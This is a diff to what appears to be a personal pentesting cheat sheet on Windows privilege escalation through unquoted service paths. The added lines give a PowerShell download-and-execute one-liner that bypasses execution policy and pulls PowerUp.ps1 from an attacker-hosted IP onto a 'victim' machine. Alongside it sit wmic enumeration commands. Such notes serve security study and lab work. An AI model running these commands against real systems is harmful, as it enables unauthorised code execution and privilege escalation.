@@ -103,7 +103,9 @@ msiexec /quiet /qn /i /pathtosoftwarecreated
 
 <h2>unquoted service paths</h2>
 Run winpeas and check for any unquoted service paths <br>
-Can try move powerview to the machine and run powerview or powerup.ps1 - Invoke-AllChecks. PowerView.ps1 - Get-ServiceUnquoted
+Can try move powerview to the machine and run powerview or powerup.ps1 - Invoke-AllChecks. PowerView.ps1 - Get-ServiceUnquoted (see below command).
+Run http server on PowerSploit directory on my linux. Type command on victim 
+powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.81/PowerUp.ps1');Get-ServiceUnquoted" (change IP)
 if winpeas wont work try run <br>
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ <br>
 for example if path -- C:\Program Files\unquoted path\Common Files <br>
